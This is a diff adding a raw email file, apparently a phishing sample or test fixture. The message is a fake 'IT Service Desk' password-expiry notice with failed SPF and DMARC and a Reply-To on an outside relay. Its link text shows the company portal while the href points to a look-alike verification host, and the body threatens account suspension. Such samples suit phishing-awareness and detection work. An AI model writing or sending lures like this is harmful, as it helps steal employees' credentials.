@@ -1,0 +1,42 @@
+Return-Path: <bounce-9914@mailrelay-services.example>
+Received: from mx-in-02.arborridge.example (localhost [127.0.0.1])
+	by mx-in-02.arborridge.example (Postfix) with ESMTP id 7A2E4B1183
+	for <r.calder@arborridge.example>; Mon, 17 Aug 2026 07:02:41 -0500 (CDT)
+Received: from relay14.mailrelay-services.example (relay14.mailrelay-services.example [192.0.2.211])
+	by mx-in-02.arborridge.example (Postfix) with ESMTP id 6F1D3B1177
+	for <r.calder@arborridge.example>; Mon, 17 Aug 2026 07:02:38 -0500 (CDT)
+Authentication-Results: mx-in-02.arborridge.example;
+	spf=fail (sender IP is 192.0.2.211) smtp.mailfrom=mailrelay-services.example;
+	dkim=none (message not signed);
+	dmarc=fail (p=none) header.from=arborridge-it.example
+From: "Arbor Ridge IT Service Desk" <no-reply@arborridge-it.example>
+Reply-To: "Password Recovery Desk" <recovery.desk@mailrelay-services.example>
+To: <r.calder@arborridge.example>
+Subject: Action required: your password expires in 24 hours
+Date: Mon, 17 Aug 2026 07:02:36 -0500
+Message-ID: <20260817120236.6F1D3B1177@relay14.mailrelay-services.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+X-Mailer: PHPMailer 6.6.3
+
+<html><body style="font-family:Arial,sans-serif;font-size:14px">
+<p>Hello R. Calder,</p>
+
+<p>Our records show that the password for your Arbor Ridge Supply Co. account
+is scheduled to <b>expire in 24 hours</b>. Accounts that are not renewed are
+suspended automatically and must be restored by the service desk, which can
+take up to three business days.</p>
+
+<p>To keep your current password and avoid suspension, confirm your account
+below:</p>
+
+<p><a href="http://arborridge-sso.account-verify.example/reset?u=r.calder&amp;id=9914">https://portal.arborridge.example/password</a></p>
+
+<p>This link expires in 24 hours. If you do not confirm, your mailbox
+and your file shares will be suspended.</p>
+
+<p>Thank you,<br>
+Arbor Ridge IT Service Desk<br>
+<i>Please do not reply to this message.</i></p>
+</body></html>
